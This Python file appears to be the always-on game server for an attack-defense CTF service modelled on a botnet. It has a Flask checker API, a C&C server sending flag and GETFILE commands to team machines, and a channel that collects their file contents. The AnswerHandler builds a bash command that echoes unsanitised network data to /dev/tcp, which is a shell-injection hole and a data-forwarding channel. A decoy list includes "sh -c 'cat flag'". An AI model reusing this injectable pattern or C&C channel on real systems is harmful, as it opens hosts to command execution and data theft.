#!/bin/python3

# This server needs to run all the time. It keeps track of all teams flag and service state and can be queried by the checker for up-to-date information.
# This running instance will be shared used between all teams.

# There are 3! Listening servers activated here:
# 1. A flask webserver that is used by the checker to communicate flag and uptime status
# 2. The C&C server, that waits for connecting peers and sends them commands
# 3. A second part of the C&C where team machines dump their files. This is used, because (2) is unidirectional communication

from common.server import *
import json
import os
import sys
import re
import random
import time
import threading
import math
import subprocess
import secrets
import string
import traceback
import select

def info(msg): # TODO add logging to persistent file
	print("INFO: ", msg, file=sys.stderr)

def warning(msg):
	print("WARNING: ", msg, file=sys.stderr)

def error(msg):
	print("ERROR: ", msg, file=sys.stderr)

alphabet = string.ascii_uppercase + string.digits + string.ascii_lowercase
def rndstr():
	return "".join(secrets.choice(alphabet) for _ in range(10))

# read teams.json
with open("teams.json") as inf:
	teamlist = json.load(inf)

teams = {}
current_tick = 0 # guessed by the last checker command
# we try to keep a json dump of the current state in case of an unexpected crash
self_dir = os.path.dirname(os.path.realpath(__file__))
STORAGE_FILE = os.path.join(self_dir, "storage.json")
if os.path.isfile(STORAGE_FILE):
	with open(STORAGE_FILE) as inf:
		teams = json.load(inf)

def save_teams():
	with open(STORAGE_FILE, "w") as outf:
		json.dump(teams, outf, indent='\t', ensure_ascii = False)

class PermaServer:
	SELF_IP_TEAMNET = "::" # TODO
	SELF_IP_GAMENET = "::" # TODO

	def __init__(self, args):
		self.is_contest = True # port config, ips etc.
		if len(args) >= 2:
			if args[1] == "local":
				self.is_contest = False
			else:
				print("Unknown option. Use 'local' or no argument")
				sys.exit(1)
		info(f"Contest-mode: {self.is_contest}")

		# in contest, we can listen on the correct ports,
		# locally we would clash with the exploit-server
		if self.is_contest:
			self.PROXY_PORT_RECV = 1236
			self.PROXY_PORT_SEND = 3334
		else:
			self.PROXY_PORT_RECV = 1111
			self.PROXY_PORT_SEND = 2222

		# Those ports are used by the teams' services
		self.TEAM_GET_PORT = 1236
		self.TEAM_SEND_PORT = 3334
	
		# General configs
		# we wait 90s. Service should run every 60s, so everyone should be ready
		if self.is_contest:
			self.WAIT_TIME_IN_TICK = 90
		else:
			self.WAIT_TIME_IN_TICK = 20
		self.MAX_CMDSTRLEN_HARD = 2048 # TODO check sanity of value
		self.MAX_CMDSTRLEN_SOFT = 1024 # TODO check sanity of value
		self.TIMEOUT = 1 # TODO good value
		
		self.dir = os.path.dirname(os.path.realpath(__file__))
		self.persistent = os.path.join(self.dir, "state.json")

		if self.is_contest:
			self.TEAM_IDS = teamlist["teams"] # [1, 995] + list(range(2, 100)) # TODO: use a list with all possible team ids
		else:
			self.TEAM_IDS = [1, 2]
	
		# TODO persistent this, cleanup?
		self.uuid_to_ip = {}
		
		if os.path.isfile(self.persistent):
			self.load_state(self.persistent)
	
	def load_state(self, fn):
		with open(fn) as inf:
			self.uuid_to_ip = json.load(inf)
	
	def add_uuidmapping(self, uuid, ip):
		if uuid in self.uuid_to_ip:
			if self.uuid_to_ip[uuid] == ip:
				pass # reusing the same uuid
			else:
				warning(f"Two teams share the same {uuid=}: {self.uuid_to_ip[uuid]} and {ip}")
		self.uuid_to_ip[uuid] = ip
		with open(self.persistent, "w") as outf:
			json.dump(self.uuid_to_ip, outf, indent='\t', ensure_ascii = False)
	
	def get_uuidmapping(self, uuid):
		if uuid in self.uuid_to_ip:
			return self.uuid_to_ip[uuid]
		return None

	def team_to_ip(self, team):
		if self.is_contest:
			return "fd66:666:" + str(team) + "::2"
		else:
			if team == 1:
				return "::1"
				#return "127.0.0.1" # we only support one team in this mode
			else:
				return "192.168.123.123" # other teams do not exist

	def get_team_data(self, ip, port):
		sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
		sock.settimeout(self.TIMEOUT)
		try:
			sock.connect((ip, port))
		except socket.timeout:
			info(f"Timeout Connection (offline) to {ip=} {port=}")
			return None
		except ConnectionRefusedError:
			info(f"TConnectionRefused (no C&C) to {ip=} {port=}")
			return None
		sock.setblocking(0)
		data = bytearray()
		while len(data) < 1024:
			ready = select.select([sock], [], [], self.TIMEOUT)
			if ready[0]:
				packet = sock.recv(1024 - len(data))
				if not packet:
					return data
				data.extend(packet)
			else:
				return data
		return data

	def get_team_commands(self):
		cmds = []
		random.shuffle(self.TEAM_IDS)
		for teamid in self.TEAM_IDS:
			ip = self.team_to_ip(teamid) # TODO inline optimize this?
			team = get_teaminfo_by_ip(ip)
			team_cmds = team["cmds"]
			cmds += team_cmds
		return cmds

class Team:
	def __init__(self):
		self.last_connect = None
		self.flag_to_place = None
		self.flag_states = {}

def get_teaminfo_by_ip(ip):
	if ip not in teams:
		teams[ip] = {
			"last_connect": None,
			"flag_to_place": None,
			"flag_states": {},
			"tick_gameserver": -1,
			"last_place_tick": -100,
			"cmds": []
		}
		save_teams()
	return teams[ip]

"""
 Receives one message from the malware containing the response to a GETFILE command
"""
class AnswerHandler(socketserver.BaseRequestHandler):
	def handle(self):
		senderip = self.request.getpeername()[0]
		self.request.setTimeout(2)
		data = self.request.recv(1024) # TODO size check
		#info(f"Got: {data} from {senderip}")
		
		# TODO there should be exactly one file per connection?
		for fm in re.findall(b"\[([a-zA-Z0-9=+/]+):([a-zA-Z0-9]+)\]", data):
			content = base64.b64decode(fm[0]).decode(errors="ignore")
			uuid = fm[1].decode(errors="ignore")
			#print(f"{uuid} requested content this is {content}")
			# forward to team
			req_ip = perma.get_uuidmapping(uuid)
			if req_ip == None:
				error(f"{uuid=} does not map to an ip")
				continue
			if req_ip == "SELF": # if we requested it, check for flag, otherwise forward to team 
				#info(f"This is for ourself")
				team = get_teaminfo_by_ip(senderip)
				for m in re.findall("FLAG\\|([0-9]+)\\|([a-zA-Z0-9\\+_/]*?)\\|", content): # TODO decode must be failignoring
					try:
						tick = int(m[0])
						flag = m[1]
						if tick in team["flag_states"]:
							fs = team["flag_states"][tick]
							if fs["flag"] != flag:
								print(senderip, "\tFlag mismatch for tick ", str(tick))
								continue
							#print(senderip, "\t", tick, "Flag found for tick ", str(tick))
							fs["last_received_tick"] = team["tick_gameserver"] # TODO more sanity
					except Exception as e:
						error("Failed understanding file" + str(e)) #TODO more
						pass
			else:
				info(f"This is a foreign requester. Forwarding content to {req_ip}")
				# again stolen from the service code
				dout = subprocess.check_output([
					"bash",
					"-c", # TODO data assumes there is really only one
					"echo " + data.decode(errors="ignore").strip() + " >/dev/tcp/" + req_ip + "/" + str(perma.TEAM_SEND_PORT)
					], timeout=perma.TIMEOUT)

def interleave(a, b):
	r = []
	i = 0
	j = 0
	rem = len(a) + len(b)
	while i < len(a) and j < len(b):
		rnd = random.randint(0, rem-1)
		if rnd <= len(a) - i:
			r.append(a[i])
			i += 1
		else:
			r.append(b[j])
			j += 1
		rem -= 1
	while i < len(a):
		r.append(a[i])
		i += 1
	while j < len(b):
		r.append(b[j])
		j += 1
	return r 

rnd_echos = [ # TODO
	"sh -c 'cat flag'",
	"}\"flag",
	"                    "
]

"""
 Sends the C&C Commands
"""
class CCHandler(socketserver.BaseRequestHandler):
	def handle(self): # TODO make this function failsave
		sender = self.request.getpeername()[0]
		info(f"Connection from {sender}")
		team = get_teaminfo_by_ip(sender)
		j = []
		# get our own content
		if team["flag_to_place"] != None:
			flag, tick = team["flag_to_place"]
			info(f"Sending flag to {sender} for tick {tick}")
			myid = rndstr()
			myoutid = rndstr()
			fakecmd = random.choice(rnd_echos)
			fakenum = rndstr()
			fakesender = rndstr()
			#num = int(time.time()) # used to define the filename used on the team server. 
			j.append({"cmd": "ECHO", "data": "FLAG|" + str(tick) + "|" + flag + "|", "outid": myoutid, "sender": myid})
			#j.append({"cmd": "GETFILE", "outid": myoutid, "sender": myid})
			team["flag_to_place"] = None
			team["flag_states"][int(tick)] = {
				#"num": num,
				"flag": flag, # store to compare
				"placed": True,
				"last_received_tick": -100,
				"outid": myoutid,
				"sender": myid,
				"fakecmd": fakecmd,
				"fakenum": fakenum
			}
			team["last_place_tick"] = int(tick)
			perma.add_uuidmapping(myid, "SELF")
		team["last_connect"] = time.time()
		save_teams()
		
		# TODO redo this with new concept
		#info(f"{sender=} {team=}") # a lot of output
		for tick in range(max(0, int(team["last_place_tick"]) - 4), team["last_place_tick"] + 1):
			if tick in team["flag_states"]:
				flaginfo = team["flag_states"][tick]
				j.append({"cmd": "GETFILE", "outid": flaginfo["outid"], "sender": flaginfo["sender"]})
		# and the other teams stuff
		tcs = perma.get_team_commands()
		j = interleave(j, tcs)
		self.request.sendall(json.dumps(j).encode())
		
from flask import Flask

app = Flask(__name__)

@app.route("/place_flag/<teamip>/<flag>/<tick>")
def place_flag(teamip, flag, tick):
	flag = flag.replace("-", "/")
	info(f"New flag {flag} for team {teamip} for tick {tick} arrived")
	team = get_teaminfo_by_ip(teamip)
	team["flag_to_place"] = (flag, tick)
	team["tickstart"] = time.time()
	team["tick_gameserver"] = int(tick)
	save_teams()
	return "OK"

@app.route("/check_flag/<teamid>/<tick>")
def check_flag(teamid, tick):
	tick = int(tick)
	info(f"{teamid}\t{tick}\t Check_flag")
	team = get_teaminfo_by_ip(teamid)
	if "tickstart" not in team:
		info(f"Missing tickstart in team")
		return "NOT_FOUND" # TODO better logging
	ts = team["tickstart"]
	ct = time.time()
	waittime = perma.WAIT_TIME_IN_TICK - (ct - ts) # we wait 90s. Should run every 60s, so everyone should be ready # TODO increase number to 90
	if waittime > 0:
		#info(f"{teamid}\t{tick}\t Waiting {waittime}")
		#time.sleep(waittime)
		#info(f"{teamid}\t{tick}\t Wait completed")
		return "WAIT" + str(int(waittime)) # because connection can not be opened more than 10 seconds
	team = get_teaminfo_by_ip(teamid)
	if tick not in team["flag_states"]:
		info(f"{teamid}\t{tick}\tTick not in flag_states")
		return "NOT_FOUND"
	state = team["flag_states"][tick]
	info(f"{teamid}\tChecking flag of tick {tick} Game is at {team['tick_gameserver']} flag is of {state['last_received_tick']}")
	if state["last_received_tick"] == team["tick_gameserver"]: # TODO better
		return "YES"
	if state["last_received_tick"] > team["tick_gameserver"]: # TODO better
		info(f"{teamid}\t{tick}\tSomehow has flags in the future")
		return "YES"
	return "NOT_FOUND"

@app.route("/check_service/<teamip>")
def check_service(teamip):
	team = get_teaminfo_by_ip(teamip)
	t = time.time()
	lc = team["last_connect"]
	if lc == None:
		team["last_connect"] = 0
		return "YES" # first connect
	diff = t - lc
	info(f"{teamip}\tChecking service: Last connect {diff:.0f} s ago")
	if diff < 90: # should be 60+20, +10s grace time
		return "YES" # TODO do checks
	else:
		return "LONGAGO" + str(int(diff))

#@app.route("/sleepsfdsdfsdfsdfsdfsdsdfsdf/<sleeptime>")
#def thread_sleep(sleeptime):
#	error("Sleeping")
#	time.sleep(int(sleeptime))
#	error("Sleeping End")
#	return ""

def get_team_command(teamid):
	ip = perma.team_to_ip(teamid)
	while True:
		time.sleep(random.random() * 30 + 30) # 30 - 60s
		# copy pasted from service code. this obfuscating is not needed here ...
		# TODO TIMEOUT / parallel?
		cmds = []
		try:
			info(f"{ip=}\tGetting team C&Cs")
			data = perma.get_team_data(ip, perma.TEAM_GET_PORT)
			if data == None:
				continue
			with open(f"cmds/{ip}.cmd", "wb") as inf:
				inf.write(data)
			if len(data) > perma.MAX_CMDSTRLEN_HARD:
				warning(f"{ip=}\tExhausts data length with {len(data)}")
				continue
			if len(data) > perma.MAX_CMDSTRLEN_SOFT:
				warning(f"{teamid=}\tClose to data length limit with {len(data)}")
			short = data[:400]
			data = data.decode(errors="replace")
			team_cmds = json.loads(data)
			if not isinstance(team_cmds, list):
				info(f"{ip=}\tNot a list{short}")
				continue
			if len(team_cmds) > 4: # Protect against DoS of our server
				info(f"{ip=}\tList has {len(team_cmds)} entries.")
				continue
			for cmd in team_cmds:
				if not "sender" in cmd: # we only care about stuff we actually touch/read
					continue
				if not isinstance(cmd["sender"], str):
					info("{ip=}\tSender is not a string but {typeof(cmd['sender'])}")
					continue
				perma.add_uuidmapping(cmd["sender"], ip)
				cmds.append(cmd)
			info(f"{ip=} sent {len(cmds)} commands {cmds=}")
		except Exception as e: # TODO (nicetohave): check for different common errors and make better messages
			ex = sys.exc_info()
			with open(f"errors/team_{teamid}.err", "w") as outf:
				outf.write(str(time.time()) + "\n")
				outf.write(traceback.format_exc())
			info(f"{ip=}\t{e}")
		finally:
			team = get_teaminfo_by_ip(ip)
			team["cmds"] = cmds

perma = PermaServer(sys.argv)
def main():
	for teamid in perma.TEAM_IDS:
		team = get_teaminfo_by_ip(perma.team_to_ip(teamid))
	# Second channel to get the responses
	answer = ThreadedTCPServer((perma.SELF_IP_TEAMNET, perma.PROXY_PORT_SEND), AnswerHandler)
	answer_thread = threading.Thread(target=answer.serve_forever)
	answer_thread.daemon = True
	answer_thread.start()
	
	# First channel send the data
	server = ThreadedTCPServer((perma.SELF_IP_TEAMNET, perma.PROXY_PORT_RECV), CCHandler)
	server_thread = threading.Thread(target=server.serve_forever)
	server_thread.daemon = True
	server_thread.start()
	
	# Threads asking for C&C commands repeatedly
	for teamid in perma.TEAM_IDS:
		query_thread = threading.Thread(target=get_team_command, args=(teamid,))
		query_thread.daemon = True
		query_thread.start()

	"""try:
		server.serve_forever()
	finally:
		server.shutdown()
	"""
	# Run the webserver where the checker can communicate to
	app.run(host='::', port=7788) # TODO limit to game net

if __name__ == "__main__":
	main()
